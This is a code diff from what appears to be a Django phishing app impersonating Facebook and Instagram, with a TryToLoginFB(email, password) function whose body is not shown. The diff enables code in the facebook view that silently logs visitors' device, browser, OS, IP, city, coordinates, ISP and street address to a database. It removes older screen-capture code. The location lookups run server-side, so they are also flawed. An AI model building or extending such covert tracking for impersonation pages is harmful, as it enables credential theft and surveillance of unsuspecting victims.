@@ -40,51 +40,42 @@ def instagram(request):
     return render(request, 'insta.html', context)
 
 def facebook(request):
-    # hostname  = socket.gethostname()
-    # ip_address = get('https://api.ipify.org').text
-    # ipData = get(f'http://ip-api.com/json/{ip_address}').text
-    # geolocator = Nominatim(user_agent="FetcherApp")
-    # Latitude = ipinfo.ipinfo()['lat']
-    # Longitude = ipinfo.ipinfo()['lon']
-    # cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))
+    hostname  = socket.gethostname()
+    ip_address = get('https://api.ipify.org').text
+    ipData = get(f'http://ip-api.com/json/{ip_address}').text
+    geolocator = Nominatim(user_agent="FetcherApp")
+    Latitude = ipinfo.ipinfo()['lat']
+    Longitude = ipinfo.ipinfo()['lon']
+    cityFromLonAndLat = geolocator.reverse(str(Latitude)+","+str(Longitude))
 
-    # dataIP = ipinfo.ipinfo()
-    # newInfo = AccountInfo.objects.create(
-    #     is_mobile = request.user_agent.is_mobile,
-    #     is_tablet = request.user_agent.is_tablet,
-    #     is_touch_capable = request.user_agent.is_touch_capable,
-    #     is_pc = request.user_agent.is_pc,
-    #     is_bot = request.user_agent.is_bot,
-    #     browser = request.user_agent.browser,
-    #     browser_family = request.user_agent.browser.family,
-    #     browser_version = request.user_agent.browser.version,
-    #     os = request.user_agent.os,
-    #     os_family = request.user_agent.os.family,
-    #     os_version = request.user_agent.os.version,
-    #     device = request.user_agent.device,
-    #     device_family = request.user_agent.device.family,
-    #     ipAddress = ip_address,
-    #     location = dataIP['country'],
-    #     region = dataIP['regionName'],
-    #     city = dataIP['city'],
-    #     latitude = dataIP['lat'],
-    #     longitude = dataIP['lon'],
-    #     timezone = dataIP['timezone'],
-    #     isp = dataIP['isp'],
-    #     fullAddress = cityFromLonAndLat
-    # )
-    # newInfo.save()
-    # # Capture the entire screen
-    # screenshot = ImageGrab.grab()
+    dataIP = ipinfo.ipinfo()
+    newInfo = AccountInfo.objects.create(
+        is_mobile = request.user_agent.is_mobile,
+        is_tablet = request.user_agent.is_tablet,
+        is_touch_capable = request.user_agent.is_touch_capable,
+        is_pc = request.user_agent.is_pc,
+        is_bot = request.user_agent.is_bot,
+        browser = request.user_agent.browser,
+        browser_family = request.user_agent.browser.family,
+        browser_version = request.user_agent.browser.version,
+        os = request.user_agent.os,
+        os_family = request.user_agent.os.family,
+        os_version = request.user_agent.os.version,
+        device = request.user_agent.device,
+        device_family = request.user_agent.device.family,
+        ipAddress = ip_address,
+        location = dataIP['country'],
+        region = dataIP['regionName'],
+        city = dataIP['city'],
+        latitude = dataIP['lat'],
+        longitude = dataIP['lon'],
+        timezone = dataIP['timezone'],
+        isp = dataIP['isp'],
+        fullAddress = cityFromLonAndLat
+    )
+    newInfo.save()
 
-    # # Save the screenshot to a file
-    # screenshot.save("media/shoots/screenshot.png")
-
-    # # Close the screenshot
-    # screenshot.close()
-
-
-    context = {'ip_address':'ip_address', 'ipData':'ipinfo.ipinfo()', 'cityFromLonAndLat':'cityFromLonAndLat'}
+    context = {'ip_address':ip_address, 'ipData':ipinfo.ipinfo(), 'cityFromLonAndLat':cityFromLonAndLat}
     return render(request, 'index.html', context)
 
 def TryToLoginFB(email,password):
